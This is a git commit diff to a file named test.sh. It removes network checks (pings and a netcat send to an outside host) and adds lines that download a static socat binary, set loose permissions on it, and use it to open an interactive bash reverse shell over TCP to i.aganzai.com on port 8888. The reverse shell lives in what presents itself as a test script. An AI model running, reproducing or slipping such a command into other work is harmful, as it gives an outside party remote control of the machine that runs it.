946a2238d6a53a9535a0d14823725dd66dc49d03
kukutt <pan3yao@gmail.com>
2020-04-10 21:45:09 +0800

    socat 1

--- test.sh
+++ test.sh
@@ -1,12 +1,4 @@
 #!/bin/bash
-echo aaaaaaaaaaaaaaaaaaaaa1
-ifconfig
-netstat -ant
-ping i.aganzai.com -c 20 
-ping www.baidu.com -c 20 
-ping www.aliyun.com -c 20 
-ping www.google.com -c 20 
-ping www.github.com -c 20 
-ping fq3.aganzai.com -c 20
-echo "test" | nc -w1 i.aganzai.com 9999
-echo aaaaaaaaaaaaaaaaaaaaa2
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+chmod 7777 socat
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
